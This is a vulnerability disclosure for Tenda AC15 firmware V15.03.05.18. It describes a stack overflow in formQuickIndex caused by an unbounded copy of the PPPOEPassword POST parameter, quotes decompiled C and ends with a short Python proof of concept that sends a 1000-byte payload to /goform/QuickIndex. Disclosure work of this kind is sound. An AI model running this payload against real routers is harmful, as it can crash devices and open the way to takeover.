## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2710.html

## Affected version

AC15 V15.03.05.18

## Vulnerability details

The Tenda AC15 V15.03.05.18 firmware has a stack overflow vulnerability in the `formQuickIndex` function. The `v8` variable receives the `PPPOEPassword` parameter from a POST request and is later assigned to the `s` variable, which is fixed at 72 bytes. However, since the user can control the input of  `PPPOEPassword`, in function `sub_4FD40`, the statement: 

```c
_BYTE *__fastcall sub_4FD40(_BYTE *result, _BYTE *a2)
{
  _BYTE *v2; // [sp+0h] [bp-Ch]
  _BYTE *v3; // [sp+4h] [bp-8h]

  v3 = result;
  v2 = a2;
  if ( result && a2 )
  {
    while ( *v3 )
    {
      if ( *v3 == 92 )
        ++v3;
      *v2++ = *v3++;
    }
    *v2 = 0;
  }
  return result;
}
```

can cause a stack overflow. The user-provided  `PPPOEPassword` can exceed the capacity of the `s` array, triggering this security vulnerability.

![image-20240306173835516](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306173835516.png)

![image-20240314221504303](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314221504303.png)

![image-20240314164426015](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314164426015.png)

![image-20240306174138778](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240306174138778.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/QuickIndex"
payload = b"a"*1000

data = {"mit_linktype":"2","PPPOEPassword": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240314221443216](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314221443216.png)